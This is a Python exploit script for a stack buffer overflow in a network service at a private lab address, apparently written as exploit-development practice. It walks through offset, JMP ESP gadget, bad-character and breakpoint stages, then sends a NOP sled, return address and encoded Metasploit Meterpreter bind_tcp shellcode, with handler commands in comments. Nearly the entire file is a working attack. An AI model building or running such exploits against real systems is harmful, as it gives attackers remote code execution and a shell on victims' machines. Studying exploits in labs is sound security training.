import socket

RHOST = "10.211.55.6"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# STAGE 0: cyclic pattern search
buffer_size = 152

# STAGE 0.5: gadget search (should not include bad chars, obviously)
# !mona j -r esp
jmp_esp = "\xa3\x14\x04\x08"

# STAGE 1: badchar detection
# null-terminator and \n by default
#
# badchars = [0x00, 0x0a]
# badchar_test = "".join(map(lambda i: chr(i) if i not in badchars else "", range(0x00, 0x100)))
# 
# with open("badchar_test.bin", "wb") as f:
#     f.write(badchar_test)
# 
# payload = "A" * buffer_size # offset buffer
# payload += jmp_esp # EIP/RIP overwrite
# payload += badchar_test # push badchars to stack
# payload += "\n"
#
# s.send(payload)
#
# !mona cmp -a esp -f \\Mac\Home\Downloads\badchar_test.bin
# !!! Hooray, normal shellcode unmodified !!!

# STAGE 2: sigtrap EIP
# payload = "A" * buffer_size
# payload += jmp_esp
# payload += "\xcc"
# payload += "\n"
# 
# s.send(payload)
#
# [13:23:25] INT3 command at 015719F4

# STAGE 3: exploitation
# msfvenom -p windows/meterpreter/bind_tcp -b '\x00\x0A' -f python --var-name shellcode EXITFUNC=thread
shellcode =  ""
shellcode += "\xdb\xc5\xb8\x92\x85\x01\xf8\xd9\x74\x24\xf4"
shellcode += "\x5a\x33\xc9\xb1\x57\x83\xea\xfc\x31\x42\x16"
shellcode += "\x03\x42\x16\xe2\x67\x79\xe9\x77\x87\x82\xea"
shellcode += "\xe7\x0e\x67\xdb\x35\x74\xe3\x4e\x8a\xff\xa1"
shellcode += "\x62\x61\xad\x51\xf0\x07\x79\x55\xb1\xa2\x5f"
shellcode += "\x58\x42\x03\x5f\x36\x80\x05\x23\x45\xd5\xe5"
shellcode += "\x1a\x86\x28\xe7\x5b\x50\x46\x08\x31\x34\x23"
shellcode += "\x84\xa5\x31\x71\x15\xc4\x95\xfd\x25\xbe\x90"
shellcode += "\xc2\xd2\x72\x9a\x12\x91\xc2\x84\x19\xfe\xf2"
shellcode += "\xb5\xce\xaf\x77\x7c\x84\x73\x3e\xf4\x51\x07"
shellcode += "\xc1\xdc\xab\xe8\xf0\x20\x67\xd7\x3d\xad\x79"
shellcode += "\x1f\xf9\x4e\x0c\x6b\xfa\xf3\x17\xa8\x81\x2f"
shellcode += "\x9d\x2f\x21\xbb\x05\x94\xd0\x68\xd3\x5f\xde"
shellcode += "\xc5\x97\x38\xc2\xd8\x74\x33\xfe\x51\x7b\x94"
shellcode += "\x77\x21\x58\x30\xdc\xf1\xc1\x61\xb8\x54\xfd"
shellcode += "\x72\x64\x08\x5b\xf8\x86\x5f\xdb\x01\x59\x60"
shellcode += "\x81\x95\x96\xad\x3a\x66\xb0\xa6\x49\x54\x1f"
shellcode += "\x1d\xc6\xd4\xe8\xbb\x11\x1a\xc3\x7c\x8d\xe5"
shellcode += "\xeb\x7c\x87\x21\xbf\x2c\xbf\x80\xbf\xa6\x3f"
shellcode += "\x2c\x6a\x52\x4b\x8b\xc4\x41\xb6\x41\xe5\xef"
shellcode += "\x4b\xfe\x0f\xe0\x94\x1e\x30\x2a\xbd\xb7\xcc"
shellcode += "\xd5\xd3\x1b\x59\x33\xb9\xb3\x0f\xeb\x56\x76"
shellcode += "\x74\x24\xc0\x89\x5f\xce\xce\x79\xda\x89\xce"
shellcode += "\x85\xe4\x7e\xa7\x32\x0d\xb8\xc8\xc2\x18\xee"
shellcode += "\x5e\x49\x4e\x2a\x7e\x4e\x5b\x1a\x17\xd9\x16"
shellcode += "\xcb\x5a\x7b\x27\xc6\x0f\x7b\xbd\xed\x99\x2c"
shellcode += "\x29\xec\xfc\x1b\xf6\x0f\x2b\x18\xf0\xf0\xaa"
shellcode += "\x32\x8b\xc7\x38\x0d\xe3\x27\xad\x8d\xf3\x71"
shellcode += "\xa7\x8d\x9b\x25\x93\xdd\xbe\x29\x0e\x72\x13"
shellcode += "\xbc\xb1\x23\xc0\x17\xda\xc9\x3f\x5f\x45\x31"
shellcode += "\x6a\xe3\x82\xcd\xea\xe3\x73\x0d\x3b\x2a\x06"
shellcode += "\x78\xf8\x09\x09\x67\xd4\x67\xa2\x3e\xbd\xc5"
shellcode += "\xaf\xc0\x68\x09\xd6\x42\x98\xf2\x2d\x5a\xe9"
shellcode += "\xf7\x6a\xdc\x02\x8a\xe3\x89\x24\x39\x03\x98"

# shikata_ga_nai blows a hole in ESP while decoding the payload. we can either stuff a lot of NOPs until it works or move it's aim (ESP) a bit lower, like this:
# metasm > sub esp,0x10
sub_esp_10 = "\x83\xec\x10"

payload = "\x90" * buffer_size
payload += jmp_esp
payload += sub_esp_10
payload += shellcode
payload += "\n"

s.send(payload)

# msf6 > use exploit/multi/handler
# 
# msf6 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
# msf6 exploit(multi/handler) > set RHOST 10.211.55.6
# msf6 exploit(multi/handler) > set LPORT 4444
# msf6 exploit(multi/handler) > set EXITFUNC thread
# msf6 exploit(multi/handler) > exploit
